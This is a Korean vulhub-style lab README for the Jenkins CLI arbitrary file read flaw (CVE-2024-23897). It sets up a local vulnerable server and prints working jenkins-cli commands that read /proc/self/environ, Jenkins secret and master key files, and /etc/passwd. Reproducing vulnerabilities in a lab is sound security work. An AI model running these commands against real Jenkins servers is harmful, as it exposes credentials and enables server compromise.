# CLI를 통한 Jenkins 임의 파일 읽기(CVE-2024-23897)

[중국어버전(Chinese version)](README.zh-cn.md)

Jenkins는 오픈소스 자동화 서버입니다.

Jenkins는 CLI 명령을 처리할 때 args4j 라이브러리를 사용하여 Jenkins 컨트롤러에서 명령 인수와 옵션을 구문 분석합니다. 이 명령 구문 분석기는 인수의 @ 문자 뒤에 오는 파일 경로를 파일 내용으로 대체하는 기능(expandAtFiles)을 가지고 있으며, 이를 통해 공격자는 Jenkins 서버에서 임의 파일을 읽을 수 있습니다.

이 취약점은 Jenkins 2.441 이전 버전에 영향을 미칩니다.


참고:

- <https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314>
- <https://mp.weixin.qq.com/s/2a4NXRkrXBDhcL9gZ3XQyw>

## 취약점 발생 환경

Jenkins 서버 2.441을 시작하려면 다음 명령을 실행하세요.

```
docker compose up -d
```

서버가 시작된 후 `http://your-ip:8080/` 을 통해 Jenkins 서버에 액세스할 수 있습니다. 기본 관리자의 사용자 이름과 비밀번호는 `admin`과 `vulhub` 입니다.


## 취약점 공격(익스플로잇)

먼저 `http://localhost:8080/jnlpJars/jenkins-cli.jar` 을 통해 명령줄 클라이언트 `jenkins-cli.jar` 를 다운로드해야 합니다.

`/proc/self/environ` 파일을 읽어 Jenkins 기본 디렉터리인 `JENKINS_HOME=/var/jenkins_home` 을 가져옵니다.

```
java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/proc/self/environ"
```

(사진1)


이 명령을 사용하면 `secrets.key` 또는 `master.key` 와 같은 민감한 파일을 익명으로 검색할 수 있습니다(명령줄에서 오류가 발생하면 파일의 첫 번째 줄만 읽을 수 있습니다).

```
java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/var/jenkins_home/secret.key"
```

(사진2)

```
java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/var/jenkins_home/secrets/master.key"
```

(사진3)

"익명 읽기 액세스 허용"이 켜져 있으므로 전체 콘텐츠도 읽을 수 있습니다. 파일:

```
java -jar jenkins-cli.jar -s http://localhost:8080/ -http connect-node "@/etc/passwd"
```

![](4.png)
